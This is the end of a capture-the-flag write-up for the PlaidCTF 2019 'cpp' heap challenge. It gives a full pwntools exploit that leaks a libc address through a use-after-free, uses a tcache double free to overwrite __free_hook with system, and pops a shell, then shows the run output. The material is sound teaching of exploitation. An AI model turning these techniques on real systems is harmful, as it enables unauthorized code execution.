Putting it all together, we get the following exploit. I ran this in Ubuntu `18.04`:

```
from pwn import *

target = process('./cpp', env={"LD_PRELOAD":"./libc-2.27.so"})

#gdb.attach(target)
#gdb.attach(target, gdbscript = 'pie b *0x167e')
#gdb.attach(target, gdbscript = 'pie b *0x1475')

libc = ELF("./libc-2.27.so")

# Establish functions to handle I/O with target
def add(name, buff):
    print target.recvuntil("Exit\n")
    target.sendline("1")
    target.sendline(name)
    print target.recvuntil("buf:")
    target.sendline(buff)
    print target.recvuntil("Done!")

def remove(index):
    print target.recvuntil("Exit\n")
    target.sendline("2")
    print target.recvuntil("idx: ")
    target.sendline(str(index))
    print target.recvuntil("Done!")

def view(index):
    print target.recvuntil("Exit\n")
    target.sendline("3")
    print target.recvuntil("idx: ")
    target.sendline(str(index))
    leak = target.recvline()
    leak = leak.strip("\n")
    leak = u64(leak + "\x00"*(8-len(leak)))
    print target.recvuntil("Done!")
    return leak

# First we need a libc infoleak

# Initialize the chunks to fill up the tcache (remember chunks get freed when we remove objects)
add("0"*8, "1"*8)
add("75395128" + "2"*0x400, "15935728")
add("3"*8, "4"*8)
add("5"*8, "6"*8)
add("7"*8, "8"*8)

remove(4)
remove(3)
remove(2)

# Free a chunk that will end up in the smallbin, and that will allow us to get the UAF
remove(0)

# Use the UAF to get the libc infoleak to the main arena, calculate the base of libc
libcBase = view(0) - 0x3ebcd0

# Allocate chunks to clear out the tcache for the free hook overwrite
for i in xrange(7):
    add("9"*8, "0"*8)


# Execute the double free
remove(5)
remove(5)

# Allocate a chunk (which because of the double free, a duplicate chunk of this exists in the tcache)
# Overwrite the next pointer to the next tcache chunk with the address of free hook
add("15935728", p64(libcBase + libc.symbols["__free_hook"]))

# Print some addresses for diagnostic purposes
print "free hook: " + hex(libcBase + libc.symbols["__free_hook"])
print "free: " + hex(libcBase + 0x3eaf98)

# Allocate a chunk to the free hook, and write the libc address of system to it
add("15935728", p64(libcBase + libc.symbols["system"]))

# Add a chunk with `/bin/sh` to call system("/bin/sh")
target.sendline('1')
target.sendline("guyinatuxedo")
target.sendline("/bin/sh\x00")

target.interactive()
```

When we run it:

```
$ python exploit.py 
[+] Starting local process './cpp': pid 9020
[*] '/Hackery/pod/modules/tcache/plaid19_cpp/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
1. Add
2. Remove
3. View
4. Exit

. . .

 File name too long
sh: 1: 00000000: not found
sh: 1: 00000000: not found
sh: 1: 00000000: not found
sh: 1: 00000000: not found
sh: 1: @d2\xbb�: not found
sh: 1: @d2\xbb�: not found
sh: 1: @d2\xbb�: not found
sh: 1:: not found
$ w
 20:57:55 up  2:49,  1 user,  load average: 0.87, 1.01, 1.33
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu :0       :0               18:38   ?xdm?   7:02   0.01s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu gnome-session --session=ubuntu
$ ls
'N'$'\177'   cpp      libc-2.27.so     try.py        ''$'\363\327\177'
 core         exploit.py   readme.md    ''$'\351\177'
```

Just like that, we got a shell!